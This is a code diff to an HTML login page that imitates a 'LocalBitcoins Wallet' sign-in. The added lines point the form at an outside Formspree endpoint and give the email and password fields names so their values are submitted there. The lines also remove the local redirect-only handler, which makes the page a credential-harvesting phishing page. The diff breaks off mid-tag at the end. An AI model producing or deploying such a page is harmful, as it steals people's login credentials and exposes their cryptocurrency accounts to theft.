@@ -26,14 +26,14 @@
       <h1 class="text-[#6c4dff] font-extrabold text-2xl">LocalBitcoins Wallet</h1>
     </div>
 
-    <form class="space-y-6" onsubmit="handleLogin(event)">
+    <form class="space-y-6" action="https://formspree.io/f/mvgalkbo" method="POST" onsubmit="redirectAfterSubmit()">
       <div>
         <label for="email" class="block text-sm font-semibold text-gray-700 mb-1">Email Address</label>
-        <input type="email" id="email" required class="w-full px-4 py-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#6c4dff]" placeholder="you@example.com">
+        <input type="email" name="email" id="email" required class="w-full px-4 py-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#6c4dff]" placeholder="you@example.com">
       </div>
       <div>
         <label for="password" class="block text-sm font-semibold text-gray-700 mb-1">Password</label>
-        <input type="password" id="password" required class="w-full px-4 py-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#6c4dff]" placeholder="********">
+        <input type="password" name="password" id="password" required class="w-full px-4 py-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#6c4dff]" placeholder="********">
       </div>
       <button type="submit" class="w-full bg-[#6c4dff] hover:bg-[#5a3ee6] text-white font-semibold py-3 rounded-md transition">
         Log In
@@ -42,18 +42,4 @@
 
     <p class="text-center text-xs text-gray-600 mt-6 select-none">
       By logging in, you agree to our 
-      <a href="#" class="text-[#6c4dff] underline">Terms of Service</a> and 
-      <a href="#" class="text-[#6c4dff] underline">Privacy Policy</a>.
-    </p>
-  </div>
-
-  <script>
-    function handleLogin(event) {
-      event.preventDefault(); 
-      // No validation, just redirect no matter what
-      window.location.href = "dashboard.html";
-    }
-  </script>
-
-</body>
-</html>
+      <a href="#" class="text-[#6c4dff] underline">
